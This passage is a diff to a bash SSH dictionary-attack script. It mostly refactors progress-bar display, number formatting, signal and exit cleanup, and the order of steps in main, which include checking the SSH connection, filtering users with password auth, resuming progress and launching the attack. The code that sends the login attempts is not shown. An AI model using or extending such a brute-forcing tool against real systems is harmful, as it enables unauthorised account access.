+    msg_info "Combinations:                ${fmt_val}"
+  fi
+  msg_info "Starting attack..."
 
   if [[ -t 1 ]]; then
     progress_bar_setup
-    progress_bar_update "${attempt}" "${total_attempts}"
+    (( PB_TRIED_ROW > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
   fi
 
   # || [[ -n ]] handles files missing a trailing newline
@@ -903,23 +1120,12 @@ launch_attack() {
       fi
 
       ((attempt++))
-      if [[ -t 1 ]]; then
+      if [[ -t 1 ]] && (( PB_TRIED_ROW > 0 )); then
         progress_bar_draw "${user}" "${pass}"
         progress_bar_update "${attempt}" "${total_attempts}"
       else
-        local fmt_att="" fmt_tot="" n i len
-        n="${attempt}"; len=${#n}
-        for (( i=0; i<len; i++ )); do
-          (( i > 0 && (len - i) % 3 == 0 )) \
-            && fmt_att+=","
-          fmt_att+="${n:i:1}"
-        done
-        n="${total_attempts}"; len=${#n}
-        for (( i=0; i<len; i++ )); do
-          (( i > 0 && (len - i) % 3 == 0 )) \
-            && fmt_tot+=","
-          fmt_tot+="${n:i:1}"
-        done
+        format_number "${attempt}" fmt_att
+        format_number "${total_attempts}" fmt_tot
         printf \
           '[%s/%s] Trying user: '\''%s'\'' password: '\''%s'\''\n' \
           "${fmt_att}" "${fmt_tot}" "${user}" "${pass}"
@@ -975,11 +1181,13 @@ evaluate_result() {
 # Handle termination signals with clean shutdown.
 handle_signal() {
   local msg="${1}" code="${2}"
-  [[ -t 1 ]] && progress_bar_clear
-  if [[ -n "${msg}" ]]; then
-    echo
-    msg_warn "${msg}"
+  if [[ -t 1 ]]; then
+    progress_bar_clear
+    # If progress_bar_setup never ran (e.g. terminal too small), cursor may
+    # be mid-line after progress_bar_draw; move to a clean line.
+    (( PB_TRIED_ROW == 0 )) && printf '\n'
   fi
+  [[ -n "${msg}" ]] && msg_warn "${msg}"
   cleanup
   exit "${code}"
 }
@@ -988,8 +1196,8 @@ handle_signal() {
 handle_winch() {
   if [[ -t 1 && ${PB_ROWS} -gt 0 ]]; then
     progress_bar_clear
-    progress_bar_setup
-    (( PB_ROWS > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
+    progress_bar_setup 1
+    (( PB_TRIED_ROW > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
   fi
 }
 
@@ -1001,6 +1209,11 @@ setup_signal_handlers() {
   trap 'handle_signal "" 143' TERM
   trap 'handle_signal "" 131' QUIT
   trap 'handle_winch' WINCH
+  # Remove temp files and reset the terminal on any exit, including early
+  # error exits before the attack starts. cleanup is idempotent — safe to
+  # call again after handle_signal or evaluate_result already ran it.
+  # \033[s/\033[u save/restore cursor position around \033[r (which homes to row 1).
+  trap 'cleanup; [[ -t 1 ]] && printf "\033[s\033[r\033[?25h\033[u" >/dev/tty 2>/dev/null' EXIT
 }
 
 ##############################
@@ -1011,10 +1224,12 @@ main() {
   read_args "${@}"                # 1. Parse command-line flags
   check_args                      # 2. Validate inputs and dependencies
   setup_signal_handlers           # 3. Set traps for clean shutdown
-  check_ssh_connection            # 4. Test SSH connectivity
-  filter_users_by_password_auth   # 5. Filter users with password auth
-  restore_progress                # 6. Resume from last attempt
-  launch_attack                   # 7. Run the dictionary attack
+  create_askpass_helper           # 4. Create SSH_ASKPASS helper
+  print_attack_config             # 5. Print attack configuration
+  check_ssh_connection            # 6. Test SSH connectivity
+  filter_users_by_password_auth   # 7. Filter users with password auth
+  restore_progress                # 8. Resume from last attempt
+  launch_attack                   # 9. Run the dictionary attack
 }
 
 main "${@}"
